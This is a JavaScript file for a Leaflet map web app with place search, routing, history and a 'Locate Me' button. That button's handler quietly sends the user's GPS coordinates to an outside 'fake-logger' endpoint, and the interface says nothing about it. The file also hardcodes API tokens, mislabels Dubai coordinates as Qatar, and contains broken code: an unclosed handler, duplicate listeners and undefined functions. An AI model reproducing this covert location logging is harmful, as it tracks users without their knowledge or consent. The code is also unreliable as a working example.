// Replace with your MapTiler key
const MAPTILER_KEY = "TCvevZOKio37CwdIPP3u";


const map = L.map('map').setView([25.276987, 55.296249], 13); // Fake location: Qatar

// MapTiler tiles
L.tileLayer(`https://api.maptiler.com/maps/streets-v2/256/{z}/{x}/{y}.png?key=YOUR_MAPTILER_API_KEY`, {
  attribution: '&copy; <a href="https://www.maptiler.com/">MapTiler</a>',
}).addTo(map);

let marker = L.marker([25.276987, 55.296249]).addTo(map).bindPopup("Fake Location: Qatar").openPopup();
let routeControl = null;
let history = [];

// 🔍 Autocomplete function
async function fetchSuggestions(query) {
  const res = await fetch(`https://api.maptiler.com/geocoding/${encodeURIComponent(query)}.json?key=YOUR_MAPTILER_API_KEY&language=en`);
  const data = await res.json();
  return data.features;
}

function createSuggestionItem(feature, callback) {
  const item = document.createElement('div');
  item.classList.add('suggestion');
  item.textContent = feature.place_name;
  item.addEventListener('click', () => callback(feature));
  return item;
}

// 📍 Search Box Logic
const searchInput = document.getElementById("searchInput");
const searchBtn = document.getElementById("searchBtn");
const searchSuggestions = document.getElementById("searchSuggestions");

searchInput.addEventListener("input", async () => {
  const value = searchInput.value.trim();
  searchSuggestions.innerHTML = "";
  if (!value) return;

  const results = await fetchSuggestions(value);
  results.forEach(feature => {
    const item = createSuggestionItem(feature, selected => {
      moveToLocation(selected);
      saveToHistory(selected);
      searchInput.value = selected.place_name;
      searchSuggestions.innerHTML = "";
    });
    searchSuggestions.appendChild(item);
  });
});

searchBtn.addEventListener("click", async () => {
  const value = searchInput.value.trim();
  if (!value) return;
  const results = await fetchSuggestions(value);
  if (results.length > 0) {
    moveToLocation(results[0]);
    saveToHistory(results[0]);
  }
});

function moveToLocation(feature) {
  const [lon, lat] = feature.center;
  if (marker) map.removeLayer(marker);
  marker = L.marker([lat, lon]).addTo(map).bindPopup(feature.place_name).openPopup();
  map.setView([lat, lon], 14);
}

function saveToHistory(feature) {
  history.push(feature.place_name);
  updateHistory();
}

function updateHistory() {
  const list = document.getElementById("historyList");
  list.innerHTML = "";
  history.slice(-10).reverse().forEach(item => {
    const li = document.createElement("li");
    li.textContent = item;
    list.appendChild(li);
  });
}

// 🧭 Direction Panel Logic
const fromInput = document.getElementById("fromInput");
const toInput = document.getElementById("toInput");
const fromSuggestions = document.getElementById("fromInputSuggestions");
const toSuggestions = document.getElementById("toInputSuggestions");

async function handleDirectionAutocomplete(inputEl, suggestionsEl, isFrom) {
  const value = inputEl.value.trim();
  suggestionsEl.innerHTML = "";
  if (!value) return;

  const results = await fetchSuggestions(value);
  results.forEach(feature => {
    const item = createSuggestionItem(feature, selected => {
      inputEl.value = selected.place_name;
      inputEl.dataset.lat = selected.center[1];
      inputEl.dataset.lon = selected.center[0];
      suggestionsEl.innerHTML = "";
    });
    suggestionsEl.appendChild(item);
  });
}

fromInput.addEventListener("input", () => handleDirectionAutocomplete(fromInput, fromSuggestions, true));
toInput.addEventListener("input", () => handleDirectionAutocomplete(toInput, toSuggestions, false));

document.getElementById("directionBtn").addEventListener("click", () => {
  const fromLat = parseFloat(fromInput.dataset.lat);
  const fromLon = parseFloat(fromInput.dataset.lon);
  const toLat = parseFloat(toInput.dataset.lat);
  const toLon = parseFloat(toInput.dataset.lon);

  if (routeControl) map.removeControl(routeControl);

  routeControl = L.Routing.control({
    waypoints: [
      L.latLng(fromLat, fromLon),
      L.latLng(toLat, toLon)
    ],
    routeWhileDragging: false
  }).addTo(map);
});

document.getElementById("closeDirectionBtn").addEventListener("click", () => {
  document.getElementById("direction-panel").style.display = "none";
});

// 📍 "Locate Me" Button
document.getElementById("locateBtn").addEventListener("click", () => {
  if (!navigator.geolocation) {
    alert("Geolocation not supported!");
    return;
  }
  navigator.geolocation.getCurrentPosition(pos => {
    const { latitude, longitude } = pos.coords;
    if (marker) map.removeLayer(marker);
    marker = L.marker([latitude, longitude]).addTo(map).bindPopup("Your Current Location").openPopup();
    map.setView([latitude, longitude], 14);
  }, () => {
    alert("Permission denied or location unavailable.");
  });
});

// 🕹️ Panel Toggles
document.getElementById("directionToggleBtn").addEventListener("click", () => {
  const panel = document.getElementById("direction-panel");
  panel.style.display = (panel.style.display === "flex") ? "none" : "flex";
});

document.getElementById("historyToggleBtn").addEventListener("click", () => {
  const panel = document.getElementById("history-panel");
  panel.style.display = (panel.style.display === "block") ? "none" : "block";
});

// 🌗 Dark Mode
document.getElementById("darkModeBtn").addEventListener("click", () => {
  document.body.classList.toggle("dark-mode");
});


// Show/hide history
document.getElementById('historyToggleBtn').addEventListener('click', () => {
  const panel = document.getElementById('history-panel');
  panel.style.display = panel.style.display === 'block' ? 'none' : 'block';
});

// Show/hide direction panel, toggle search box
document.getElementById('directionToggleBtn').addEventListener('click', () => {
  const dir = document.getElementById('direction-panel');
  const search = document.querySelector('.floating-search');
  dir.style.display = 'block';
  search.style.display = 'none';
});

document.getElementById('closeDirectionBtn').addEventListener('click', () => {
  document.getElementById('direction-panel').style.display = 'none';
  document.querySelector('.floating-search').style.display = 'flex';
});

// Search Place
document.getElementById('searchBtn').addEventListener('click', () => {
// Setup clear button functionality ONCE
const searchInput = document.getElementById('searchInput');
const clearBtn = document.getElementById('clearSearch');

searchInput.addEventListener('input', () => {
  clearBtn.style.display = searchInput.value.length > 0 ? 'block' : 'none';
});

clearBtn.addEventListener('click', () => {
  searchInput.value = '';
  clearBtn.style.display = 'none';
  document.getElementById('searchSuggestions').innerHTML = '';
  searchInput.focus();
});

// Search Place logic
document.getElementById('searchBtn').addEventListener('click', () => {
  const place = searchInput.value;

  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${place}`)
    .then(res => res.json())
    .then(data => {
      if (data && data.length > 0) {
        const lat = data[0].lat, lon = data[0].lon;
        map.setView([lat, lon], 15);
        L.marker([lat, lon], { icon: googleRedIcon }).addTo(map);
        addHistory(`Searched: ${place}`);
      }
    });
});



// Autocomplete for Search
document.getElementById('searchInput').addEventListener('input', function () {
  const query = this.value;
  const container = document.getElementById('searchSuggestions');
  container.innerHTML = '';
  if (query.length < 2) return;

  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}`)
    .then(res => res.json())
    .then(data => {
      data.slice(0, 5).forEach(place => {
        const div = document.createElement('div');
        div.className = 'suggestion';
        div.textContent = place.display_name;
        div.addEventListener('click', () => {
          document.getElementById('searchInput').value = place.display_name;
          container.innerHTML = '';
        });
        container.appendChild(div);
      });
    });
});

// Directions
let control;
document.getElementById('directionBtn').addEventListener('click', () => {
  const from = document.getElementById('fromInput').value;
  const to = document.getElementById('toInput').value;
  if (control) map.removeControl(control);

  control = L.Routing.control({
    waypoints: [],
    router: L.Routing.mapbox('pk.eyJ1IjoibWFwdGlsZXIiLCJhIjoiY2t1OXlhbDFvMGc0dTJvcGQ5NmR3eHZybyJ9.d1m4w4O0qln07trDQUuKAw'),
    createMarker: (i, wp) => {
      return L.marker(wp.latLng, {
        icon: i === 0 ? customStartIcon : googleRedIcon
      });
    }
  }).addTo(map);

  Promise.all([
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${from}`).then(res => res.json()),
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${to}`).then(res => res.json())
  ]).then(([fromData, toData]) => {
    if (fromData.length && toData.length) {
      const fromLatLng = L.latLng(fromData[0].lat, fromData[0].lon);
      const toLatLng = L.latLng(toData[0].lat, toData[0].lon);
      control.setWaypoints([fromLatLng, toLatLng]);
      addHistory(`Direction: ${from} → ${to}`);
    }
  });
});

// Autocomplete for Directions
['fromInput', 'toInput'].forEach(id => {
  const input = document.getElementById(id);
  const suggestionBox = document.getElementById(`${id}Suggestions`);

  input.addEventListener('input', () => {
    const query = input.value;
    suggestionBox.innerHTML = '';
    if (query.length < 2) return;

    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${query}`)
      .then(res => res.json())
      .then(data => {
        data.slice(0, 5).forEach(place => {
          const div = document.createElement('div');
          div.className = 'suggestion';
          div.textContent = place.display_name;
          div.addEventListener('click', () => {
            input.value = place.display_name;
            suggestionBox.innerHTML = '';
          });
          suggestionBox.appendChild(div);
        });
      });
  });
});

// 🌍 Locate User
document.getElementById('locateBtn').addEventListener('click', () => {
  navigator.geolocation.getCurrentPosition(pos => {
    const lat = pos.coords.latitude, lon = pos.coords.longitude;
    map.setView([lat, lon], 15);
    L.marker([lat, lon], { icon: currentLocationIcon }).addTo(map);
    addHistory(`Current Location: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);

    // 🧠 Send to backend
    fetch('https://fake-logger.onrender.com/logger.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        lat: lat,
        lon: lon,
        source: 'leaflet',
        gps: true
      })
    });
  });
});
